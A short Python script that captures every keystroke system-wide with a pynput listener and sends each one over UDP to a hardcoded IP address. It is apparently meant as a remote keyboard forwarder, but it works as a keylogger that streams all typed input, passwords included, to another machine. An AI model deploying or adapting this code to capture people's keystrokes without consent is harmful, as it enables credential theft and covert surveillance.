import socket
from pynput import keyboard

# Set up UDP
UDP_IP = "172.23.84.192"     # Change to target IP
UDP_PORT = 5005          # Change to target port
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def on_press(key):
    print(key)
    try:
        # Get the character and send it
        char = key.char
        sock.sendto(char.encode('utf-8'), (UDP_IP, UDP_PORT))
        print(f"Sent: {char}")
    except AttributeError:
        # Handle special keys like space, enter, etc.
        special = str(key)
        sock.sendto(special.encode('utf-8'), (UDP_IP, UDP_PORT))
        print(f"Sent special: {special}")

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    print(f"Listening for keyboard input... sending to {UDP_IP}:{UDP_PORT}")
    listener.join()
